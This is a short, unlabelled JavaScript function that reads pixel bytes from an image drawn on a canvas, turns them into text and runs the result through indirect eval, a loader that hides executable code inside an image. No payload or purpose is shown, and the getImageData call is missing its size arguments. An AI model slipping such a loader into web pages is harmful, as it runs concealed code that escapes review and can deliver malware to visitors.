
            z = function() {
                c = String.fromCharCode;
                q = document.querySelector.bind(document);
                x = q("#c").getContext("2d");
                x.drawImage(q("img"), 0, 0);
                d = x.getImageData(0, 0,).data;
                b = [];
                s = 1E6;
                p = b.push.bind(b);
                l = function(a) {
                    for (i = a; i < a + s && i < d.length; i += 4) p(c(d[i])), p(c(d[i + 1])), p(c(d[i + 2]));
                    a < d.length ? setTimeout(function() {
                        l(a + s)
                    }, 0) : (s = b.join("").replace(/\\0/g, " "), (0, eval)(s))
                };
                l(0)
            };
